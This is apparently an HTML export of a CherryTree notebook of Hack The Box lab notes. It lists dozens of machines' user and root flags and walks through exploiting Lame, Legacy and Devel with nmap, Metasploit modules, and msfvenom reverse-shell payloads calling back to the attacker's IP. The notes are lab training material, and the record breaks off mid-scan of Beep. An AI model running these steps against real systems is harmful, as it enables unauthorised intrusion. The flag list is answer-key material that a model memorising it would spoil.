<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Schmid_2106.ctb</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title level-1'>Machines</h1><br/></div><div class='page'><h1 class='title level-2'>HTB</h1><br/><br /></div><div class='page'><h1 class='title level-3'>Flags</h1><br/>Lame<br />	user<br />	69454a937d94f5f0225ea00acd2e84c5<br />	root<br />	92caac3be140ef409e45721348a4e9df<br />Legacy<br />	user<br />	e69af0e4f443de7e36876fda4ec7644f<br />	root<br />	993442d258b0e0ec917cae9e695d5713<br />Devel<br />	user<br />	9ecdd6a3aedf24b41562fea70f4cb3e8<br />	root<br />	e621a0b5041708797c4fc4728bc72b4b<br />Beep<br />    user<br />    aeff3def0c765c2677b94715cffa73ac<br />    root<br />    d88e006123842106982acce0aaf453f0<br />Optimum<br />    user<br />    d0c39409d7b994a9a1389ebf38ef5f73<br />    root<br />    51ed1b36553c8461f4552c2e92b3eeed<br />Bashed<br />    user<br />    2c281f318555dbc1b856957c7147bfc1<br />    root<br />    cc4f0afe3a1026d402ba10329674a8e2<br />Arctic<br />    user<br />    02650d3a69a70780c302e146a6cb96f3<br />    root<br />    ce65ceee66b2b5ebaff07e50508ffb90<br /> Blue<br />    user  <br />    4c546aea7dbee75cbd71de245c8deea9<br />    root<br />    ff548eb71e920ff6c08843ce9df4e717<br />Grandpa<br />    user<br />    bdff5ec67c3cff017f2bedc146a5d869<br />    root<br />    9359e905a2c35f861f6a57cecf28bb7b<br />Granny<br />    user<br />    700c5dc163014e22b3e408f8703f67d1<br />    root<br />    aa4beed1c0584445ab463a6747bd06e9 <br />Bank<br />    user<br />    37c97f8609f361848d8872098b0721c3<br />    root<br />    d5be56adc67b488f81a4b9de30c8a68e<br />Blocky<br />    user    <br />    59fee0977fb60b8a0bc6e41e751f3cd5<br />    root<br />    0a9694a5b4d272c694679f7860f1cd5f<br />Netmon<br />    user<br />    dd58ce67b49e15105e88096c8d9255a5<br />    root<br />    3018977fb944bf1878f75b879fba67cc<br />Mirai<br />    user<br />    ff837707441b257a20e32199d7c8838d<br />    root<br />    3d3e483143ff12ec505d026fa13e020b<br />Luke<br />    user<br />    58d441e500e8941f9cf3baa499e2e4da<br />    root<br />    8448343028fadde1e2a1b0a44d01e650<br />Networked<br />    user<br />    526cfc2305f17faaacecf212c57d71c5<br />    root<br />    0a8ecda83f1d81251099e8ac3d0dcb82<br />Jarvis<br />    user<br />    2afa36c4f05b37b34259c93551f5c44f<br />    root<br />    d41d8cd98f00b204e9800998ecf84271<br />Haystack<br />    user<br />    04d18bc79dac1d4d48ee0a940c8eb929<br />    root<br />    3f5f727c38d9f70e1d2ad2ba11059d92<br />Craft<br />    user<br />    bbf4b0cadfa3d4e6d0914c9cd5a612d4<br />    root<br />    831d64ef54d92c1af795daae28a11591<br />Resolute<br />    user<br />    0c3be45fcfe249796ccbee8d3a978540<br />    root<br />    <br />Tally<br />    user<br />    be72362e8dffeca2b42406d5d1c74bb1<br />    root<br />    608bb707348105911c8991108e523eda<br />Bart<br />    user<br />    625b6c7aa299599acae0125d3af3830f<br />    root<br />    0074a38e6eac2d3785741713b3bfa2dc<br />Active<br />    user<br />    86d67d8ba232bb6a254aa4d10159e983<br />    root<br />    b5fc76d1d6b91d77b2fbf2d54d0f708b<br />FriendZone<br />    user<br />    a9ed20acecd6c5b6b52f474e15ae9a11<br />    root<br />OpenAdmin<br />    user<br />    c9b2cf07d40807e62af62660f0c81b5f<br />    root<br />    2f907ed450b361b2c2bf4e8795d5b561<br />Traverxec<br />    user<br />    7db0b48469606a42cec20750d9782f3d<br />    root<br />    9aa36a6d76f785dfd320a478f6e0d906<br />Shocker<br />    user<br />    2ec24e11320026d1e70ff3e16695b233<br />    root<br />    52c2715605d70c7619030560dc1ca467<br />Chatterbox<br />    user<br />    72290246dfaedb1e3e3ac9d6fb306334<br />    root<br />    a673d1b1fa95c276c5ef2aa13d9dcc7c<br />Jerry<br />    user<br />    7004dbcef0f854e0fb401875f26ebd00<br />    root<br />    04a8b36e1545a455393d067e772fe90e<br />Access<br />    user<br />    ff1f3b48913b213a31ff6756d2553d38<br />    root<br />    6e1586cc7ab230a8d297e8f933d904cf<br />Forest<br />    user<br />    e5e4e47ae7022664cda6eb013fb0d9ed<br />    root<br />    f048153f202bbb2f82622b04d79129cc<br />Ypuffy<br />    user <br />    acbc06eb2982b14c2756b6c6e3767aab<br />    root<br />    1265f8e0a1984edd9dc1b6c3fcd1757f<br />Remote<br />    user<br />    caa705d07837cb1a56e1cd960f8eef11<br />    root<br />    08e3d9f2e8933bca70f9a196d55e9ce8<br />Traceback<br />    user<br />    01233e70fe91310fc2b969b6dd1444a7<br />    root<br />    9a95739d93a3f9327d3120ee63613d21<br />Bastion<br />    user<br />    9bfe57d5c3309db3a151772f9d86c6cd<br />    root<br />    958850b91811676ed6620a9c430e65c8<br />Sauna<br />    user<br />    1b5520b98d97cf17f24122a55baf70cf<br />    root<br />    f3ee04965c68257382e31502cc5e881f<br />Monteverde<br />    user<br />    4961976bd7d8f4eeb2ce3705e2f212f2<br />    root<br />    12909612d25c8dcf6e5a07d1a804a0bc<br />Mango<br />    user<br />    79bf31c6c6eb38a8567832f7f8b47e92<br />    root<br />    8a8ef79a7a2fbb01ea81688424e9ab15    <br />Obscurity<br />    user<br />    e4493782066b55fe2755708736ada2d7<br />    root<br />    512fd4429f33a113a44d5acde23609e3<br />Bastard<br />    user<br />    ba22fde1932d06eb76a163d312f921a2<br />    root<br />    4bf12b963da1b30cc93496f617f7ba7c<br />Silo<br />    user<br />    92ede778a1cc8d27cb6623055c331617<br />    root<br />    cd39ea0af657a495e33bc59c7836faf6<br />DevOops<br />    user<br />    c5808e1643e801d40f09ed87cdecc67b<br />    root<br />    d4fe1e7f7187407eebdd3209cb1ac7b3<br />ScriptKiddy<br />	user	<br />	99ba87dfc32b49504a759cbb0bc5e526<br />	root<br />	675a3cc887357fc961c3ce2d3315385c<br />SecNotes<br />	user<br />	6fa7556968052a83183fb8099cb904f3<br />	root<br />	7250cde1cab0bbd93fc1edbdc83d447b</div><div class='page'><h1 class='title level-3'>1-99</h1><br/></div><div class='page'><h1 class='title level-4'>10.10.10.3 Lame</h1><br/>Lame<br />root@kali:~/Desktop# nmap -sC -sV -oN /root/Desktop/10.10.10.3.txt 10.10.10.3<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-07-02 19:57 EDT<br />Nmap scan report for 10.10.10.3<br />Host is up (0.31s latency).<br />Not shown: 996 filtered ports<br />PORT    STATE SERVICE     VERSION<br />21/tcp  open  ftp         vsftpd 2.3.4<br />|_ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />| ftp-syst: <br />|   STAT: <br />| FTP server status:<br />|      Connected to 10.10.14.60<br />|      Logged in as ftp<br />|      TYPE: ASCII<br />|      No session bandwidth limit<br />|      Session timeout in seconds is 300<br />|      Control connection is plain text<br />|      Data connections will be plain text<br />|      vsFTPd 2.3.4 - secure, fast, stable<br />|_End of status<br />22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)<br />| ssh-hostkey: <br />|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)<br />|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)<br />139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br />445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)<br />Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Host script results:<br />|_clock-skew: mean: -2d22h57m14s, deviation: 0s, median: -2d22h57m14s<br />| smb-os-discovery: <br />|   OS: Unix (Samba 3.0.20-Debian)<br />|   NetBIOS computer name: <br />|   Workgroup: WORKGROUP\x00<br />|_  System time: 2019-06-29T17:01:24-04:00<br />|_smb2-time: Protocol negotiation failed (SMB2)<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 81.78 seconds<br />---------------------------------------------------------------------------------------------------------------------------------------------------<br />ftp 10.10.10.3<br />    anonymous<br />        dir (goofy responce) LOCKED IN FTP DIR<br /><br />searchsploit vsftpd<br />        patched (no backdoor)<br /><br />searchsploit samba<br />    Samba 3.0.20 &lt; 3.0.25rc3 - &#39;Username&#39; map script&#39; Command Execution (Metasploit)     | exploits/unix/remote/16320.rb<br />msfconsole<br />    use exploit/multi/samba/usermap_script<br />    set payload cmd/unix/reverse<br />    lhost 10.10.14.60<br />    lport 6969<br />    run<br />        ROOT SESSION<br />        shell (kicked off a python shell)        <br />            root.txt on Desktop<br />            user.txt at /home/makis<br />   </div><div class='page'><h1 class='title level-4'>10.10.10.3 Lame 2</h1><br/><br />nmap showed that ftp, ssh, and smb were open.<br />ftp annonymous was allowed, but no files were there.<br />ssh confirmed an old ubuntu version<br />ftp version looked vulnerable but the exploit did not work manually or with metasploit<br />smb was running 3.0.20.<br /><a href="https://github.com/macha97/exploit-smb-3.0.20/blob/master/exploit-smb-3.0.20.py">https://github.com/macha97/exploit-smb-3.0.20/blob/master/exploit-smb-3.0.20.py</a><br />ran it and rooted<br /><br />^^added proper shellcode and ip in script<br /><br /><br /><br /><br /><br /><br /><br />./vsftpd_234_exploit.py &lt;IP address&gt; &lt;port&gt; &lt;command&gt;</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/><br />attempted vsftpd_234_exploit.py, does not appear vulnerable.<br />samba 3.0.20.py does the trick!</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1m1e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.10.10.3 &amp;&amp; nmap -sC -sV -Pn 10.10.10.3 &amp;&amp; nmap -p- -Pn 10.10.10.3<br />1<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-22 14:09 EDT<br />Nmap scan report for 10.10.10.3<br />Host is up (0.25s latency).<br />Not shown: 996 filtered ports<br />PORT    STATE SERVICE<br />21/tcp  open  ftp<br />22/tcp  open  ssh<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br /><br />Nmap done: 1 IP address (1 host up) scanned in 14.11 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-22 14:09 EDT<br />Nmap scan report for 10.10.10.3<br />Host is up (0.24s latency).<br />Not shown: 996 filtered ports<br />PORT    STATE SERVICE     VERSION<br />21/tcp  open  ftp         vsftpd 2.3.4<br />|_ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />| ftp-syst: <br />|   STAT: <br />| FTP server status:<br />|      Connected to 10.10.14.60<br />|      Logged in as ftp<br />|      TYPE: ASCII<br />|      No session bandwidth limit<br />|      Session timeout in seconds is 300<br />|      Control connection is plain text<br />|      Data connections will be plain text<br />|      vsFTPd 2.3.4 - secure, fast, stable<br />|_End of status<br />22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)<br />| ssh-hostkey: <br />|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)<br />|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)<br />139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br />445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)<br />Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Host script results:<br />|_clock-skew: mean: -3d00h57m32s, deviation: 2h49m43s, median: -3d02h57m33s<br />| smb-os-discovery: <br />|   OS: Unix (Samba 3.0.20-Debian)<br />|   Computer name: lame<br />|   NetBIOS computer name: <br />|   Domain name: hackthebox.gr<br />|   FQDN: lame.hackthebox.gr<br />|_  System time: 2020-04-19T11:12:46-04:00<br />| smb-security-mode: <br />|   account_used: &lt;blank&gt;<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />|_smb2-time: Protocol negotiation failed (SMB2)<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 71.55 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-22 14:10 EDT<br />Nmap scan report for 10.10.10.3<br />Host is up (0.23s latency).<br />Not shown: 65530 filtered ports<br />PORT     STATE SERVICE<br />21/tcp   open  ftp<br />22/tcp   open  ssh<br />139/tcp  open  netbios-ssn<br />445/tcp  open  microsoft-ds<br />3632/tcp open  distccd<br /><br />Nmap done: 1 IP address (1 host up) scanned in 332.50 seconds<br /></div><div class='page'><h1 class='title level-6'>smb</h1><br/></div><div class='page'><h1 class='title level-7'>enum4linux</h1><br/>enum4linux -a 10.10.10.3<br />Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Wed Apr 22 14:10:50 2020<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 10.10.10.3<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ================================================== <br />|    Enumerating Workgroup/Domain on 10.10.10.3    |<br /> ================================================== <br />[E] Can&#39;t find workgroup/domain<br /><br /><br /> ========================================== <br />|    Nbtstat Information for 10.10.10.3    |<br /> ========================================== <br />Looking up status of 10.10.10.3<br />No reply from 10.10.10.3<br /><br /> =================================== <br />|    Session Check on 10.10.10.3    |<br /> =================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.<br />[E] Server doesn&#39;t allow session using username &#39;&#39;, password &#39;&#39;.  Aborting remainder of tests.<br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />69454a937d94f5f0225ea00acd2e84c5<br />root<br />92caac3be140ef409e45721348a4e9df</div><div class='page'><h1 class='title level-4'>10.10.10.4 Legacy</h1><br/>Legacy<br />nmap -sC -sV -oN /root/Desktop/10.10.10.4.txt 10.10.10.4<br />    Nmap scan report for 10.10.10.4<br />    Host is up (0.14s latency).<br />    Not shown: 997 filtered ports<br />    PORT     STATE  SERVICE       VERSION<br />    139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn<br />    445/tcp  open   microsoft-ds  Windows XP microsoft-ds<br />    3389/tcp closed ms-wbt-server<br />    Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp<br /><br />    Host script results:<br />    |_clock-skew: mean: 5d00h27m15s, deviation: 2h07m16s, median: 4d22h57m15s<br />    |_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:5c:c3 (VMware)<br />    | smb-os-discovery: <br />    |   OS: Windows XP (Windows 2000 LAN Manager)<br />    |   OS CPE: cpe:/o:microsoft:windows_xp::-<br />    |   Computer name: legacy<br />    |   NetBIOS computer name: LEGACY\x00<br />    |   Workgroup: HTB\x00<br />    |_  System time: 2019-07-08T01:38:16+03:00  <br />    | smb-security-mode: <br />    |   account_used: guest<br />    |   authentication_level: user<br />    |   challenge_response: supported<br />    |_  message_signing: disabled (dangerous, but default)<br />    |_smb2-time: Protocol negotiation failed (SMB2)<br />msfconsole<br />    use exploit/windows/meterpreter/reverse_tcp             &lt;&lt;&lt;&lt; use exploit/multi/handler    &gt; set payload windows/meterpreter/reverse_tcp<br />    run<br />    SYSTEM SESSION</div><div class='page'><h1 class='title level-4'>10.10.10.4 Legacy 2</h1><br/><br />nmap showed that the only open port faceing me was smb<br />smbvuln showed me that it may be vulnerable to ms17-010<br />msfconsole<br />use exploit windows/smb/ms17_010_psexec<br />set payload windows/meterpreter/reverse_tcp<br />rhost<br />lhost<br />lport<br />go<br />rooted</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo http://www.kellyodonnell.com/content/determining-os-type-ping ; nmap -Pn 10.10.10.4 &amp;&amp; nmap -sC -sV -Pn 10.10.10.4 &amp;&amp; nmap -p- -Pn 10.10.10.4<br />ttl=127<br />http://www.kellyodonnell.com/content/determining-os-type-ping<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-22 15:20 EDT<br />Nmap scan report for 10.10.10.4<br />Host is up (0.18s latency).<br />Not shown: 997 filtered ports<br />PORT     STATE  SERVICE<br />139/tcp  open   netbios-ssn<br />445/tcp  open   microsoft-ds<br />3389/tcp closed ms-wbt-server<br /><br />Nmap done: 1 IP address (1 host up) scanned in 13.73 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-22 15:20 EDT<br />Nmap scan report for 10.10.10.4<br />Host is up (0.16s latency).<br />Not shown: 997 filtered ports<br />PORT     STATE  SERVICE       VERSION<br />139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn<br />445/tcp  open   microsoft-ds  Windows XP microsoft-ds<br />3389/tcp closed ms-wbt-server<br />Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp<br /><br />Host script results:<br />|_clock-skew: mean: 5d00h27m16s, deviation: 2h07m16s, median: 4d22h57m16s<br />|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:40:8c (VMware)<br />| smb-os-discovery: <br />|   OS: Windows XP (Windows 2000 LAN Manager)<br />|   OS CPE: cpe:/o:microsoft:windows_xp::-<br />|   Computer name: legacy<br />|   NetBIOS computer name: LEGACY\x00<br />|   Workgroup: HTB\x00<br />|_  System time: 2020-04-28T00:18:20+03:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />|_smb2-time: Protocol negotiation failed (SMB2)<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 71.03 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-22 15:21 EDT<br />Nmap scan report for 10.10.10.4<br />Host is up (0.14s latency).<br />Not shown: 65532 filtered ports<br />PORT     STATE  SERVICE<br />139/tcp  open   netbios-ssn<br />445/tcp  open   microsoft-ds<br />3389/tcp closed ms-wbt-server<br /><br />Nmap done: 1 IP address (1 host up) scanned in 238.42 seconds<br /></div><div class='page'><h1 class='title level-6'>enum4linux</h1><br/>enum4linux -a 10.10.10.4<br />Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Apr 22 15:21:42 2020<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 10.10.10.4<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ================================================== <br />|    Enumerating Workgroup/Domain on 10.10.10.4    |<br /> ================================================== <br />[+] Got domain/workgroup name: HTB<br /><br /> ========================================== <br />|    Nbtstat Information for 10.10.10.4    |<br /> ========================================== <br />Looking up status of 10.10.10.4<br />	LEGACY          &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service<br />	HTB             &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name<br />	LEGACY          &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service<br />	HTB             &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections<br /><br />	MAC Address = 00-50-56-B9-40-8C<br /><br /> =================================== <br />|    Session Check on 10.10.10.4    |<br /> =================================== <br />[E] Server doesn&#39;t allow session using username &#39;&#39;, password &#39;&#39;.  Aborting remainder of tests.<br /></div><div class='page'><h1 class='title level-6'>smb vuln nmap</h1><br/>squid@CoolHandKali:/Yeet/Machines/HTB/Legacy$ nmap --script smb-vuln* -Pn -p 139,445 10.10.10.4<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-22 15:22 EDT<br />Nmap scan report for 10.10.10.4<br />Host is up (0.19s latency).<br /><br />PORT    STATE SERVICE<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br /><br />Host script results:<br />| smb-vuln-ms08-067: <br />|   VULNERABLE:<br />|   Microsoft Windows system vulnerable to remote code execution (MS08-067)<br />|     State: VULNERABLE<br />|     IDs:  CVE:CVE-2008-4250<br />|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,<br />|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary<br />|           code via a crafted RPC request that triggers the overflow during path canonicalization.<br />|           <br />|     Disclosure date: 2008-10-23<br />|     References:<br />|       <a href="https://technet.microsoft.com/en-us/library/security/ms08-067.aspx">https://technet.microsoft.com/en-us/library/security/ms08-067.aspx</a><br />|_      <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250</a><br />|_smb-vuln-ms10-054: false<br />|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)<br />| smb-vuln-ms17-010: <br />|   VULNERABLE:<br />|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)<br />|     State: VULNERABLE<br />|     IDs:  CVE:CVE-2017-0143<br />|     Risk factor: HIGH<br />|       A critical remote code execution vulnerability exists in Microsoft SMBv1<br />|        servers (ms17-010).<br />|           <br />|     Disclosure date: 2017-03-14<br />|     References:<br />|       <a href="https://technet.microsoft.com/en-us/library/security/ms17-010.aspx">https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</a><br />|       <a href="https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/">https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</a><br />|_      <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</a><br /><br />Nmap done: 1 IP address (1 host up) scanned in 8.90 seconds<br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />e69af0e4f443de7e36876fda4ec7644f<br />root<br />993442d258b0e0ec917cae9e695d5713</div><div class='page'><h1 class='title level-4'>10.10.10.5 Devel</h1><br/>Devel<br />ssh -sC -sV -oN /root/Desktop/10.10.10.5.txt 10.10.10.5<br />    ftp anonymous was open<br />        put verified<br />    http iis7.5<br />    <br />    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=10.10.14.60 lport=6969 -f aspx -o Yeetdevel.aspx<br />    cd /root/Desktop/Shellcodes<br />    ftp 10.10.10.5<br />        anonymous<br />        put Yeetdevel.aspx<br />    msfconsole<br />        use exploit/multi/handler<br />            set payload windows/meterpreter/reverse_tcp<br />            lhost 10.10.14.60<br />            lport 6969<br />            run<br />            SESSION CREATED<br />                iis user<br />        search suggest<br />        use post/multi/recon/local_exploit_suggester<br />            set session 1<br />            run<br />                kitrap0d recomended (service could not be verified)<br />       use windows/local/ms10_015_kitrap0d<br />           set session 1<br />           set lport 4444<br />           set lhost 10.10.14.60<br />           run<br />           SYSTEM SESSION CREATED<br />flags found and submitted<br />        </div><div class='page'><h1 class='title level-4'>10.10.10.5 Devel2</h1><br/>will windows 7 and newer execute asp? → not by default<br />nmap showed that ftp and http was running.<br />iis was version 7.5 indicating windows server 2008r2<br /><br />ftp anonymous was allowed, and host the web root.<br />msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.60 lport=3234 -f aspx -a x86 --platform win  &gt; 3234.aspx<br />upload 3234.aspx<br />navigate to website and catch with nc<br />first shell.<br /><br />whoami /all showed that seimpersonate was enabled. The machine is between 2008 and 2016 so we shoult be good with juicy potatox86<br />we are<br />rooted<br /><br /><br /><br /><br /><br /><br /><br /><br />VVVVVVVVVVV<br /><a href="https://infinitelogins.com/2020/01/20/hack-the-box-write-up-devel-without-metasploit/">https://infinitelogins.com/2020/01/20/hack-the-box-write-up-devel-without-metasploit/</a><br />^^^^^^^^^^^^^</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>iis  =7.5 = windows server 2008r2<br /><br />x86</div><div class='page'><h1 class='title level-6'>nmap</h1><br/><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-24 16:08 EDT<br />Nmap scan report for 10.10.10.5<br />Host is up (0.18s latency).<br />Not shown: 998 filtered ports<br />PORT   STATE SERVICE<br />21/tcp open  ftp<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 13.11 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-24 16:08 EDT<br />Nmap scan report for 10.10.10.5<br />Host is up (0.19s latency).<br />Not shown: 998 filtered ports<br />PORT   STATE SERVICE VERSION<br />21/tcp open  ftp     Microsoft ftpd<br />| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />| 03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client<br />| 04-28-20  06:18AM                 2883 devel.aspx<br />| 03-17-17  05:37PM                  689 iisstart.htm<br />| 04-28-20  06:04AM                 2841 shell.aspx<br />|_03-17-17  05:37PM               184946 welcome.png<br />| ftp-syst: <br />|_  SYST: Windows_NT<br />80/tcp open  http    Microsoft IIS httpd 7.5<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Microsoft-IIS/7.5<br />|_http-title: IIS7<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 24.71 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-24 16:09 EDT<br />Nmap scan report for 10.10.10.5<br />Host is up (0.13s latency).<br />Not shown: 65533 filtered ports<br />PORT   STATE SERVICE<br />21/tcp open  ftp<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 178.46 seconds</div><div class='page'><h1 class='title level-6'>web</h1><br/></div><div class='page'><h1 class='title level-7'>web nmap</h1><br/>PORT   STATE SERVICE REASON  VERSION<br />80/tcp open  http    syn-ack Microsoft IIS httpd 7.5<br />|_http-server-header: Microsoft-IIS/7.5<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />9ecdd6a3aedf24b41562fea70f4cb3e8<br />root<br />e621a0b5041708797c4fc4728bc72b4b</div><div class='page'><h1 class='title level-4'>Extras</h1><br/></div><div class='page'><h1 class='title level-4'>Extras</h1><br/></div><div class='page'><h1 class='title level-4'>10.10.10.7 Beep</h1><br/>Beep<br />nmap -sC -sV -oN /root/Desktop/10.10.10.7.txt 10.10.10.7<br />Nmap scan report for 10.10.10.7<br />Host is up (0.21s latency).<br />Not shown: 988 closed ports<br />PORT      STATE SERVICE    VERSION<br />22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)<br />| ssh-hostkey: <br />|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)<br />|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)<br />25/tcp    open  smtp       Postfix smtpd<br />|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, <br />80/tcp    open  http       Apache httpd 2.2.3<br />|_http-server-header: Apache/2.2.3 (CentOS)<br />|_http-title: Did not follow redirect to <a href="https://10.10.10.7/">https://10.10.10.7/</a><br />110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4<br />|_pop3-capabilities: EXPIRE(NEVER) LOGIN-DELAY(0) UIDL IMPLEMENTATION(Cyrus POP3 server v2) APOP PIPELINING AUTH-RESP-CODE RESP-CODES USER STLS TOP<br />111/tcp   open  rpcbind    2 (RPC #100000)<br />| rpcinfo: <br />|   program version   port/proto  service<br />|   100000  2            111/tcp  rpcbind<br />|   100000  2            111/udp  rpcbind<br />|   100024  1            742/udp  status<br />|_  100024  1            745/tcp  status<br />143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4<br />|_imap-capabilities: SORT IMAP4 ACL QUOTA SORT=MODSEQ THREAD=REFERENCES OK STARTTLS THREAD=ORDEREDSUBJECT URLAUTHA0001 LIST-SUBSCRIBED BINARY UNSELECT UIDPLUS IMAP4rev1 X-NETSCAPE LISTEXT CONDSTORE IDLE CATENATE ANNOTATEMORE MULTIAPPEND Completed ID NO CHILDREN MAILBOX-REFERRALS NAMESPACE 